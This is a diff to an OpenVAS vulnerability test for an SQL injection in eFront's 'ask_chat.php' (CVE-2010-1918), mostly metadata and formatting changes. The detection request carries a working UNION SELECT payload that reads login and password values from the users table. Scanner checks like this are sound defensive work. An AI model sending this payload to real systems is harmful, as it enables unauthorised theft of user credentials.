@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_efront_sql_inj_vuln.nasl 5306 2017-02-16 09:00:16Z teissa $
+# $Id: gb_efront_sql_inj_vuln.nasl 12392 2018-11-16 19:26:25Z cfischer $
 #
 # eFront 'ask_chat.php' SQL Injection Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = 'cpe:/a:efrontlearning:efront';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800778");
-  script_version("$Revision: 5306 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
+  script_version("$Revision: 12392 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-16 20:26:25 +0100 (Fri, 16 Nov 2018) $");
   script_tag(name:"creation_date", value:"2010-05-19 14:50:39 +0200 (Wed, 19 May 2010)");
   script_cve_id("CVE-2010-1918");
   script_bugtraq_id(40032);
@@ -42,29 +42,30 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("secpod_efront_detect.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("efront/detected");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view,
-  add, modify or delete information in the back-end database.
+  add, modify or delete information in the back-end database.");
 
-  Impact Level: Application.");
   script_tag(name:"affected", value:"eFront version 3.6.2 and prior.");
+
   script_tag(name:"insight", value:"The flaw exists due to an error in 'ask_chat.php', which fails
   to properly sanitise input data passed via the 'chatrooms_ID' parameter.");
-  script_tag(name:"solution", value:"Upgrade to eFront 3.6.2 build 6551 or later,
-  For updates refer to http://www.efrontlearning.net/");
+
+  script_tag(name:"solution", value:"Upgrade to eFront 3.6.2 build 6551 or later.");
   script_tag(name:"summary", value:"This host is running eFront and is prone to SQL injection
   vulnerability.");
 
   script_xref(name:"URL", value:"http://secunia.com/advisories/39728");
   script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1101");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/1005-exploits/MOPS-2010-018.pdf");
+  script_xref(name:"URL", value:"http://www.efrontlearning.net/");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_app");
 
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
@@ -75,12 +76,9 @@ if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
-url = dir + "/ask_chat.php?chatrooms_ID=0%20" +
-            "UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%2" +
-            "0from%20users%20--%20x";
+url = dir + "/ask_chat.php?chatrooms_ID=0%20UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%20from%20users%20--%20x";
 
 if( http_vuln_check( port:port, url:url, pattern:"0 UNION select concat\(login,0x2e,password\)", extra_check:"admin", check_header:TRUE ) ) {
-  ## Check for the substring in the Response
   report = report_vuln_url( port:port, url:url );
   security_message( port:port, data:report );
   exit( 0 );
